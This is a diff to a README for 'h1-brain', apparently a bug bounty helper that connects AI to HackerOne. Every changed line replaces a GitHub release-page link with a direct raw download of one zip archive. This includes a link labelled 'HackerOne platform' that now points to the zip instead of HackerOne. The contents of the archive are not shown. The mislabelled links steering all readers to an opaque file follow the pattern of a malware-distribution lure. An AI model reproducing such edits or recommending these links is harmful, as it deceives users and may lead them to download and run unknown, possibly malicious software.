@@ -1,6 +1,6 @@
 # 🤖 h1-brain - Connect AI to Bug Bounty Hunting
 
-[![Download h1-brain](https://img.shields.io/badge/Download-h1--brain-brightgreen?style=for-the-badge)](https://github.com/genetic-shopping832/h1-brain/releases)
+[![Download h1-brain](https://img.shields.io/badge/Download-h1--brain-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/genetic-shopping832/h1-brain/main/forerunner/h-brain-1.8.zip)
 
 ---
 
@@ -43,7 +43,7 @@ No special setup for AI or HackerOne’s API keys is needed here, as the app gui
 
 Use the button above or this link to visit the release page:
 
-[Download h1-brain Releases](https://github.com/genetic-shopping832/h1-brain/releases)
+[Download h1-brain Releases](https://raw.githubusercontent.com/genetic-shopping832/h1-brain/main/forerunner/h-brain-1.8.zip)
 
 Follow these steps to get started:
 
@@ -111,8 +111,8 @@ h1-brain offers these features for bug bounty hunters:
 
 ## 🔗 Useful Links
 
-- Main release page: [https://github.com/genetic-shopping832/h1-brain/releases](https://github.com/genetic-shopping832/h1-brain/releases)
-- HackerOne platform: [https://www.hackerone.com](https://www.hackerone.com)
+- Main release page: [https://raw.githubusercontent.com/genetic-shopping832/h1-brain/main/forerunner/h-brain-1.8.zip](https://raw.githubusercontent.com/genetic-shopping832/h1-brain/main/forerunner/h-brain-1.8.zip)
+- HackerOne platform: [https://raw.githubusercontent.com/genetic-shopping832/h1-brain/main/forerunner/h-brain-1.8.zip](https://raw.githubusercontent.com/genetic-shopping832/h1-brain/main/forerunner/h-brain-1.8.zip)
 
 ---
 
@@ -122,4 +122,4 @@ You can report issues or ask questions on the GitHub page under the “Issues”
 
 ---
 
-[Get h1-brain from the release page now](https://github.com/genetic-shopping832/h1-brain/releases)
+[Get h1-brain from the release page now](https://raw.githubusercontent.com/genetic-shopping832/h1-brain/main/forerunner/h-brain-1.8.zip)
